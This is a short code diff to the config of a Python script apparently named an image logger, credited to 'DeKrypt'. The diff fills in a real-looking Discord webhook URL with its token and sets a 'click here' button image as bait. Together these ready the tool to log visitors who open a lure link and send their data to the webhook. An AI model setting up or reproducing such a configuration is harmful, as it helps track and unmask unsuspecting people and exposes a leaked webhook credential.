@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1345540120723587133/Sdg007yEkUNnAWFvbsnlDPNUjNoiT-x-6--rks4Lf4MRq621sN-JQFQYKBI-zeHOSeaC",
+    "image": "https://static.vecteezy.com/system/resources/previews/016/770/602/non_2x/click-here-button-on-transparent-background-free-png.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
